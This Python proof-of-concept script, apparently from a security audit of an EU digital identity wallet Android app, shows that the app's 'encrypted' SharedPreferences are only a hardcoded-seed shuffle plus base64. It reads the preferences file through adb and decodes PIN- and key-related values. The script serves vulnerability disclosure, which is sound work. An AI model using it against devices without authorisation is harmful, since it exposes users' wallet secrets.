#!/usr/bin/env python3
"""
VULN-04: Decode the "encrypted" SharedPreferences values.
The app claims SharedPreferences are encrypted (PrefsController.kt:194).
In reality, it's a Fisher-Yates shuffle with hardcoded seed [1,3,5,7,9,2,4,6,8].

Usage:
    python3 04-decode-shuffle.py <shuffled_string>
    python3 04-decode-shuffle.py   # reads from eudi-wallet.xml via adb
"""

import base64
import subprocess
import sys
import xml.etree.ElementTree as ET

FY_SEED = [1, 3, 5, 7, 9, 2, 4, 6, 8]


def unshuffle(s: str, seed: list[int] = FY_SEED) -> str:
    """Reverse the Fisher-Yates shuffle used by StringExtensions.kt"""
    items = list(s)
    for i in reversed(range(len(items))):
        k = seed[i % len(seed)] % len(items)
        items[k], items[i] = items[i], items[k]
    return "".join(items)


def shuffle(s: str, seed: list[int] = FY_SEED) -> str:
    """Forward shuffle (for encoding)"""
    items = list(s)
    for i in range(len(items)):
        k = seed[i % len(seed)] % len(items)
        items[k], items[i] = items[i], items[k]
    return "".join(items)


def b64_decode(s: str) -> str:
    padded = s + "=" * (4 - len(s) % 4) if len(s) % 4 else s
    return base64.b64decode(padded).decode("utf-8")


def b64_encode(s: str) -> str:
    return base64.b64encode(s.encode("utf-8")).decode("utf-8").rstrip("=")


def decode_value(shuffled: str) -> str:
    """Unshuffle then base64 decode"""
    unshuffled = unshuffle(shuffled)
    return b64_decode(unshuffled)


def encode_value(plaintext: str) -> str:
    """Base64 encode then shuffle"""
    encoded = b64_encode(plaintext)
    return shuffle(encoded)


def read_prefs_from_adb() -> dict[str, str]:
    """Read SharedPreferences via adb"""
    pkg = "com.scytales.av.dev"
    prefs_path = f"/data/data/{pkg}/shared_prefs/eudi-wallet.xml"
    cmd = f'adb shell "run-as {pkg} cat {prefs_path}"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"Error reading prefs: {result.stderr}")
        sys.exit(1)

    root = ET.fromstring(result.stdout)
    values = {}
    for child in root:
        name = child.get("name", "")
        if child.tag == "string":
            values[name] = child.text or ""
        elif child.tag == "boolean":
            values[name] = child.get("value", "")
        elif child.tag == "int":
            values[name] = child.get("value", "")
        elif child.tag == "long":
            values[name] = child.get("value", "")
    return values


def main():
    if len(sys.argv) > 1:
        # Decode a single value
        shuffled = sys.argv[1]
        print(f"Input:    {shuffled}")
        print(f"Decoded:  {decode_value(shuffled)}")
        return

    # Read all from device
    print("=" * 60)
    print("  VULN-04: SharedPreferences 'Encryption' Decoder")
    print("=" * 60)
    print()

    prefs = read_prefs_from_adb()

    print("Raw SharedPreferences:")
    for k, v in prefs.items():
        print(f"  {k} = {v}")
    print()

    print("Decoded string values (unshuffle + base64):")
    for k, v in prefs.items():
        if k in ("CryptoAlias", "PinEnc", "PinIv", "BiometricAuthentication"):
            try:
                decoded = decode_value(v)
                print(f"  {k}:")
                print(f"    Obfuscated: {v[:50]}...")
                print(f"    Decoded:    {decoded}")
            except Exception as e:
                print(f"  {k}: decode error ({e})")
    print()

    print("Non-string values (stored in cleartext):")
    for k, v in prefs.items():
        if k not in ("CryptoAlias", "PinEnc", "PinIv", "BiometricAuthentication"):
            print(f"  {k} = {v}")
    print()

    print("Conclusion:")
    print("  The 'encryption' is a Fisher-Yates shuffle with")
    print("  hardcoded seed [1, 3, 5, 7, 9, 2, 4, 6, 8].")
    print("  Any value can be decoded with this script.")
    print("  Booleans, integers, and longs are stored in cleartext.")


if __name__ == "__main__":
    main()
